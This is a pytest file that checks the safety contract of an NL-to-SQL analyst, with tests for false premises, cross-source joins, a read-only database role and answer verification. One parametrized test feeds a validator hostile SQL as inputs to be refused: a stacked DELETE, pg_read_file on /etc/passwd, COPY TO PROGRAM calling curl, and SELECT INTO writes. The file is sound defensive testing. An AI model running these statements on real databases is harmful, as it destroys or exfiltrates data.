"""The NL-to-SQL contract, case by case.

WHY THIS FILE EXISTS ALONGSIDE test_ai_controls.py
--------------------------------------------------
`test_ai_controls.py` proves the gates work. This file proves the CONTRACT is
what anyone would expect it to be, with one test per named case, so that a
reviewer can read seven short assertions and know exactly what the system does
with:

    1. a valid question                  5. a cross-source query
    2. an unsupported question           6. generated SQL bypassing validation
    3. a false premise                   7. an answer not backed by result rows
    4. dangerous SQL

Every test names the gate that enforces it. When a gate is renamed or removed,
the test that depended on it fails by name rather than silently becoming a test
of something else.

THE SHAPE OF THE SYSTEM
-----------------------
    question
      -> guards        (false premise?)
      -> retrieval     (any evidence?)
      -> nl_to_sql     (one of the 41 catalogued statements, or refuse)
      -> sql_validator (is that statement safe?)
      -> read-only DB   (SELECT only, enforced by the role)
      -> verification   (is every number in the rows?)

There is no generation step. The translator RANKS the catalogue and returns a
statement verbatim; it has no path that reaches the validator with invented
SQL. Case 6 exists to keep it that way.
"""

from __future__ import annotations

import sys

import pytest

from conftest import REPO_ROOT

sys.path.insert(0, str(REPO_ROOT / "backend"))

from app.ai import guards, nl_to_sql  # noqa: E402
from app.ai import retrieval  # noqa: E402
from app.ai import verification as verify  # noqa: E402
from app.ai.analyst import analyse, document_answer  # noqa: E402
from app.ai.sql_validator import validate  # noqa: E402
from app.services.query_catalogue import CataloguedQuery, load_catalogue  # noqa: E402


@pytest.fixture
def client(api_client):
    return api_client


# ==============================================================================
# CASE 1 - a valid question is answered from real rows
# ==============================================================================


def test_case_1_a_supported_question_is_answered_with_rows_from_the_database(client):
    """Gate: none. This is the happy path, and it must stay cheap and real."""
    response = client.post("/api/ai/ask", json={"question": "olist revenue by state"})
    assert response.status_code == 200, response.text
    body = response.json()

    assert body["answered"] is True, body["reason"]
    assert body["stopped_at"] == ""
    assert body["query"] == "olist.geography_revenue_concentration"
    assert body["source"] == "olist"
    assert body["rows"], "an answer with no rows is an answer with no evidence"
    assert body["columns"] == list(body["rows"][0])
    assert body["sql"], "the SQL that ran must be reported, not summarised"
    assert body["citations"], "an answer must cite what supports it"


# ==============================================================================
# CASE 2 - an unsupported question is refused, not improvised
# ==============================================================================


def test_case_2_a_question_with_no_catalogued_query_returns_no_factual_claim():
    """Gate: `nl_to_sql` at MIN_SCORE.

    The failure this prevents is the dangerous one: an improvised query that
    returns rows, which then get quoted as an answer. There is no fallback
    generator, so below the score there is only a refusal and a list of
    near-misses.
    """
    result = nl_to_sql.translate("what is the churn rate per zodiac sign")

    assert result.ok is False
    assert result.sql is None, f"a statement was produced: {result.sql}"
    assert result.query is None
    assert result.reason, "a refusal must explain itself"

    answer = analyse("what is the churn rate per zodiac sign")
    assert answer.answered is False
    assert answer.stage == "translation", answer.stage
    assert answer.sql is None
    assert answer.rows == []
    assert answer.answer == ""


def test_case_2b_a_question_naming_no_dataset_asks_which_one():
    """Two sources is a refusal; zero sources is a clarifying question.

    Neither is an error, and neither runs anything - the difference is that
    "which dataset?" is a question the caller can act on.
    """
    both = analyse("compare revenue across datasets")
    assert both.answered is False
    assert both.stage in ("translation", "false_premise"), both.stage

    neither = nl_to_sql.translate("what were the top sellers last quarter")
    assert neither.sql is None
    assert not neither.sources_named or not neither.sources_required


# ==============================================================================
# CASE 3 - a false premise is corrected, not confirmed
# ==============================================================================


def test_case_3_a_false_premise_is_refused_with_a_correction():
    """Gate: `guards`, before anything is retrieved or executed.

    "The OmniRetail total" is the canonical case: four unrelated companies with
    no shared key space. Confirming it would invent a number, and running any
    query for it would invent a join.
    """
    answer = analyse("What is the total OmniRetail revenue?")

    assert answer.answered is False
    assert answer.stage == "false_premise", answer.stage
    assert answer.matched_rules, "the refusal must name the rule that fired"
    assert "combined_total" in answer.matched_rules, answer.matched_rules
    assert answer.corrections, "a refusal must correct, not merely decline"
    correction = answer.corrections[0]
    assert correction["citation"], "the correction must point at a file"
    assert not answer.rows
    assert not answer.sql


def test_case_3b_a_guard_correction_points_at_text_that_actually_exists():
    """A correction citing a line that says something else is worse than none."""
    from pathlib import Path

    for correction in analyse(
        "What is the total OmniRetail revenue?"
    ).corrections:
        citation = correction.get("citation", "")
        path_part = citation.split("#L")[0]
        assert path_part, correction
        target = REPO_ROOT / path_part
        assert target.exists(), f"the correction cites a file that is not there: {citation}"
        if "#L" in citation:
            line_no = int(citation.split("#L")[1].split()[0])
            lines = target.read_text(encoding="utf-8").splitlines()
            assert line_no <= len(lines), f"{citation} is past the end of the file"


# ==============================================================================
# CASE 4 - dangerous SQL is blocked
# ==============================================================================


@pytest.mark.parametrize(
    "statement",
    [
        "DELETE FROM olist.orders",
        "UPDATE olist.orders SET order_status = 'x'",
        "INSERT INTO olist.orders (order_id) VALUES (1)",
        "DROP TABLE olist.orders",
        "ALTER TABLE olist.orders ADD COLUMN z int",
        "CREATE TABLE olist.evil (i int)",
        "TRUNCATE olist.orders",
        "GRANT ALL ON olist.orders TO omniretail",
        "REVOKE SELECT ON olist.orders FROM omniretail",
        # The one that a keyword list alone misses.
        "SELECT 1; DELETE FROM olist.orders",
        # File access. `pg_read_file` is a real function the read-only role can
        # call, which is why the validator forbids it by name.
        "SELECT pg_read_file('/etc/passwd')",
        # Writing to the server, not the database.
        "COPY olist.orders TO PROGRAM 'curl http://example.com'",
        "SELECT * FROM olist.orders INTO OUTFILE '/tmp/leak.csv'",
        # A write that begins with SELECT. PostgreSQL reads this as CREATE
        # TABLE AS, so every keyword above misses it and the "must be a read"
        # check passes it. Found by inspection, not by a scanner; omniretail_
        # readonly refused it too, but the validator is the gate that explains.
        "SELECT * INTO exfil FROM olist.orders",
        "SELECT 1 AS x INTO TEMP TABLE scratch",
    ],
)
def test_case_4_the_validator_refuses_every_dangerous_statement(statement):
    """Gate: `sql_validator`.

    Asserted on the validator directly rather than through the analyst,
    because the analyst never produces these strings - it has no generator.
    The validator is the last line, so it is tested as the last line.
    """
    verdict = validate(statement)
    assert not verdict.ok, (
        f"the validator accepted a dangerous statement: {statement!r}"
    )
    assert verdict.violations, "a refusal must say why"


def test_case_4b_a_real_read_is_not_refused_by_the_same_validator():
    """The other direction, or the control above is satisfied by refusing all."""
    for statement in (
        "SELECT count(*) FROM olist.orders",
        "SELECT o.customer_unique_id FROM olist.orders o LIMIT 10",
    ):
        verdict = validate(statement)
        assert verdict.ok, verdict.explain()


def test_case_4c_the_read_only_role_refuses_it_independently():
    """Three independent layers, so one bug is not one breach.

    The validator is application code and can be edited. The role privilege is
    not. Both are asserted, and so is the role's own default.
    """
    import psycopg

    from app.core.config import get_settings

    settings = get_settings()
    conn = psycopg.connect(
        host=settings.postgres_host,
        port=settings.postgres_port,
        dbname=settings.postgres_db,
        user=settings.postgres_readonly_user,
        password=settings.postgres_readonly_password,
        connect_timeout=10,
    )
    try:
        with conn.cursor() as cur:
            with pytest.raises(Exception) as caught:
                cur.execute("DELETE FROM olist.orders WHERE false")
            assert "read-only" in str(caught.value).lower()

        # The failed statement aborted the transaction; every later command
        # would be refused with InFailedSqlTransaction unless it is ended.
        conn.rollback()
        with conn.cursor() as cur:
            cur.execute("SHOW default_transaction_read_only")
            assert cur.fetchone()[0] == "on"
    finally:
        conn.rollback()
        conn.close()


# ==============================================================================
# CASE 5 - a cross-source query is blocked
# ==============================================================================


def test_case_5_the_validator_refuses_a_statement_joining_two_sources():
    """Gate: `sql_validator`, cross-source guard.

    This is a SCHEMA property before it is a code property: there is no foreign
    key anywhere in this database that crosses a schema boundary. The validator
    refuses the statement anyway, because the schema not having a relationship
    is not the same as a query being unable to spell one.
    """
    statement = (
        "SELECT o.order_id, t.day FROM olist.orders o "
        "JOIN dunnhumby.transactions t ON o.customer_id = t.household_key"
    )
    verdict = validate(statement)
    assert not verdict.ok
    assert any(
        "cross" in v.message.lower() or "cross" in v.rule.lower()
        for v in verdict.violations
    ), verdict.explain()


def test_case_5b_a_question_naming_two_datasets_is_refused_not_merged(client):
    """Gate: `guards` / `nl_to_sql` source detection.

    Two datasets in one question is the signature of a cross-source join, so
    the translator refuses rather than picking one and answering half the
    question.
    """
    response = client.post(
        "/api/ai/ask",
        json={"question": "compare olist revenue with dunnhumby sales"},
    )
    assert response.status_code == 200
    body = response.json()
    assert body["answered"] is False, "two sources were merged into one answer"
    assert body["rows"] == []


def test_case_5c_the_translator_never_returns_a_cross_source_statement():
    """Exhaustive over the whole catalogue.

    One example would prove the guard works once. This proves it has not been
    switched off: every catalogued statement is validated and must be safe.
    """
    for query in load_catalogue().values():
        verdict = validate(query.sql)
        assert verdict.ok, (
            f"{query.qualified_name} no longer passes its own validator: "
            f"{verdict.explain()}"
        )


# ==============================================================================
# CASE 6 - generated SQL cannot bypass validation
# ==============================================================================


def test_case_6_the_translator_has_no_generation_path():
    """The structural argument, asserted.

    There is no LLM call and no template that composes SQL from the question.
    The only thing that can reach the validator is a statement that is already
    in `backend/sql/<source>/*.sql`, which is what makes case 6 true by
    construction rather than by policy.

    Checked on the CODE, not the prose: the module's docstring explains at
    length why `openai` is not used, and a substring search over the whole
    source would match that explanation. What matters is whether the module
    imports or calls anything.
    """
    import ast
    import inspect

    tree = ast.parse(inspect.getsource(nl_to_sql))
    imported: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(a.name.split(".")[0] for a in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            imported.add(node.module.split(".")[0])

    for forbidden in ("openai", "anthropic", "requests", "httpx", "urllib", "llm"):
        assert forbidden not in imported, (
            f"nl_to_sql now imports {forbidden!r}; if SQL can be generated from "
            f"a question, this module and its validator contract must be "
            f"re-read before the change is accepted"
        )


def test_case_6b_an_injected_statement_cannot_enter_the_catalogue(client, monkeypatch):
    """If SQL could be supplied from anywhere, the validator would still gate it.

    Monkeypatching the catalogue with a write statement is the closest thing to
    a supply-chain compromise that can be written as a test: the statement did
    not come from the database, and it must still be refused.
    """
    from app.services.query_catalogue import CataloguedQuery

    hostile = CataloguedQuery(
        name="injected",
        source="olist",
        question="an injected query",
        sql="DELETE FROM olist.orders",
        file="(not a real file)",
    )
    original = nl_to_sql.load_catalogue
    monkeypatch.setattr(
        nl_to_sql, "load_catalogue", lambda: {"olist.injected": hostile}
    )

    verdict = validate(hostile.sql)
    assert not verdict.ok
    assert verdict.violations

    answer = analyse("olist.injected")
    assert answer.answered is False, "a hostile catalogue entry was executed"
    monkeypatch.setattr(nl_to_sql, "load_catalogue", original)


def test_case_6c_a_validator_refusal_stops_the_request_at_that_gate(client):
    """Refusal is a 200 with `stopped_at`, never a partial answer.

    A request that reached execution despite a validator refusal would be
    indistinguishable from one that did not, so the stage has to be reported.
    """
    from app.ai.analyst import Answer, _refuse

    refusal = _refuse("q", "sql_validator", "because", query="olist.x")
    assert refusal.answered is False
    assert refusal.stopped_at == "sql_validator"
    assert isinstance(refusal, Answer)


# ==============================================================================
# CASE 7 - the final answer is backed by the result rows
# ==============================================================================


def test_case_7_every_number_in_an_answer_is_present_in_the_rows(client):
    """Gate: `verification`, the last one.

    This is the property that makes the rest worth having: an answer cannot
    state a figure the query did not return, no matter which stage composed
    the prose.

    Asserted on the verification block the analyst itself produced, rather than
    by re-running the checker over the raw answer text. The answer legitimately
    contains figures that are NOT query results - the query's own name, a
    relevance score from retrieval - and re-checking the whole string without
    the analyst's label-scrubbing produces false failures on a correct answer.
    The check that matters is the one the pipeline actually runs.
    """
    body = client.post(
        "/api/ai/ask", json={"question": "olist revenue by state"}
    ).json()
    assert body["answered"] is True

    verified = body["verified"]
    assert verified is not None, "the answer reports no verification at all"
    assert verified["ok"] is True, verified["failures"]
    assert verified["failures"] == []
    assert verified["checked"], "nothing was actually checked"
    assert verified["checks"], "the checks that ran must be named"
    assert set(verified["checks"]) == {"rendered_cells", "prose_numbers"}

    # And the rows really are the query's: a row for a state, with numbers.
    assert body["rows"]
    for row in body["rows"]:
        for value in row.values():
            assert isinstance(value, (int, float, str, type(None)))


def test_case_7b_the_verifier_actually_rejects_an_invented_number():
    """The control for 7: a verifier that accepts everything proves nothing."""
    rows = [{"state": "SP", "orders": 41745, "revenue": 5998226.96}]
    invented = "Sao Paulo had 51000 orders and revenue of 12,000,000."

    result = verify.verify_prose(
        invented, rows, labels=verify.label_values(["state", "orders", "revenue"], rows)
    )
    assert not result.ok
    assert result.failures


def test_case_7c_an_answer_with_no_query_behind_it_is_rejected():
    """A claim with no execution has no rows to check against, so it cannot be
    verified - and an unverifiable answer is withheld."""
    claim = verify.Claim(
        text="olist had 99441 orders", value="99441", kind="measurement"
    )
    result = verify.verify_claims([claim], None, query_name="<none>")
    assert not result.ok


def test_case_7d_a_document_answer_states_no_measurement_at_all():
    """The retrieval path quotes; it never measures.

    `/api/ai/ask/document` returns passages with citations. If it started
    stating figures, there would be no query behind them and case 7 would have
    no rows to check against - so it must quote and nothing else.
    """
    answer = document_answer("what does the data dictionary say about discount signs")

    if answer.answered:
        assert answer.query is None, "a document answer ran a query"
        assert answer.sql is None
        assert answer.rows == []
        assert answer.citations
        for hit in answer.evidence:
            assert (REPO_ROOT / hit["path"]).exists(), hit["path"]


# ==============================================================================
# THE CORPUS UNDERNEATH ALL OF IT
# ==============================================================================


def test_retrieval_cites_text_that_is_actually_in_the_file():
    """A citation is a promise that a reader can go and check it."""
    found = retrieval.evidence_for("cross-source join", limit=3)
    for hit in found["hits"]:
        target = REPO_ROOT / hit["path"]
        assert target.exists(), f"cited file does not exist: {hit['path']}"
        body = target.read_text(encoding="utf-8")
        probe = hit["text"].strip()[:60]
        if probe and not probe.startswith("..."):
            assert probe in body, (
                f"{hit['citation']} quotes text that is not in {hit['path']}"
            )


def test_retrieval_returns_nothing_rather_than_something_weak():
    """Below the relevance floor, the honest answer is no evidence.

    The probe is derived from the corpus vocabulary rather than hardcoded: a
    fixed nonsense string stops being nonsense the first time anyone writes
    that word into a document, and this test would then fail for the retriever
    doing exactly the right thing.
    """
    vocabulary = set(retrieval.load_corpus().doc_freq)
    probe = []
    seed = 0
    while len(probe) < 3:
        seed += 1
        for candidate in (f"zq{seed}vb", f"xw{seed}nk", f"pm{seed}tr", f"kj{seed}ht"):
            if candidate not in vocabulary:
                probe.append(candidate)
            if len(probe) == 3:
                break

    found = retrieval.evidence_for(" ".join(probe), limit=5)
    assert found["hits"] == []
    assert found["citations"] == []
    assert found["supported"] is False


def test_every_guard_rule_appears_in_the_guards_module():
    """The guard set is not empty and its rules are named.

    A vacuous rule list would make the citation test pass for the wrong reason.
    """
    from app.ai import guards as guards_module

    names = _guard_rule_names(guards_module)
    assert names, "the guards module registers no rules"
    assert "combined_total" in names


def _guard_rule_names(guards_module):
    """The rule names, whichever way the module exposes its registry."""
    for attribute in ("PREMISES", "PREMISE", "RULES", "_PREMISES"):
        registry = getattr(guards_module, attribute, None)
        if registry:
            return {p.name for p in registry}
    # Fall back to the private tuple the module builds its rules from.
    for value in vars(guards_module).values():
        if (
            isinstance(value, (tuple, list))
            and value
            and all(hasattr(v, "name") and hasattr(v, "citation") for v in value)
        ):
            return {v.name for v in value}
    return set()


# Every guard, the question that trips it, and a phrase that must appear within
# the block of GROUNDING_CONTRACT.md its citation points at. A stale line number
# is worse than no citation because it looks checked, so this table is what
# catches the drift.
_GUARD_DOCS = (
    ("combined_total", "What is the total OmniRetail revenue?", "omnitotal"),
    ("cross_source_identity",
     "Which customers are in both Olist and dunnhumby?", "cross-source joins are forbidden"),
    ("coupon_redemptions_key",
     "What is the primary key of dunnhumby.coupon_redemptions?", "there isn't one"),
    ("reviews_grain",
     "Is review_id the primary key of olist.reviews?", "(review_id, order_id)"),
    ("dunnhumby_population", "How many dunnhumby customers are there?", "801"),
    ("olist_customer_is_a_person", "How many Olist customers are there?",
     "customer_unique_id"),
    ("competitor_data", "Show me Olist market share against DataCo", "market-share"),
)


@pytest.mark.parametrize(
    "rule_name,question,phrase", _GUARD_DOCS, ids=[g[0] for g in _GUARD_DOCS]
)
def test_guard_citations_still_point_at_the_contract(rule_name, question, phrase):
    """A guard's citation must resolve to the contract text that backs it.

    Re-resolving every `#L<n>` catches the common failure: the contract is
    edited, lines shift, and the citation quietly becomes a lie.
    """
    result = guards.check(question)
    matching = [c for c in result.corrections if c["rule"] == rule_name]
    assert matching, (
        f"{rule_name!r} did not fire for {question!r}; matched={result.matched}"
    )

    contract = REPO_ROOT / "backend" / "app" / "ai" / "GROUNDING_CONTRACT.md"
    lines = contract.read_text(encoding="utf-8").splitlines()

    for correction in matching:
        citation = correction["citation"]
        assert citation.startswith("backend/app/ai/GROUNDING_CONTRACT.md#L"), (
            f"{rule_name} cites {citation!r}, which is not a contract line"
        )
        line_no = int(citation.rsplit("#L", 1)[1])
        assert 1 <= line_no <= len(lines), (
            f"{rule_name} cites line {line_no} of a {len(lines)}-line contract"
        )

        # The heading the rule is filed under, plus the body under it. A heading
        # is followed by prose, not by the next heading.
        window = "\n".join(lines[line_no - 1: line_no + 9]).lower()
        assert phrase in window, (
            f"{rule_name} cites {citation}, but {phrase!r} is not in the contract "
            f"at or after that line:\n{window}"
        )


def test_a_refusal_names_the_rule_that_fired():
    """A refusal the user cannot trace is a refusal that teaches nothing."""
    result = guards.check("What is the total OmniRetail revenue?")
    assert result.triggered
    assert result.matched
    assert result.corrections
    for correction in result.corrections:
        assert correction["citation"], "a correction must cite a file"
        assert correction["rule"] in result.matched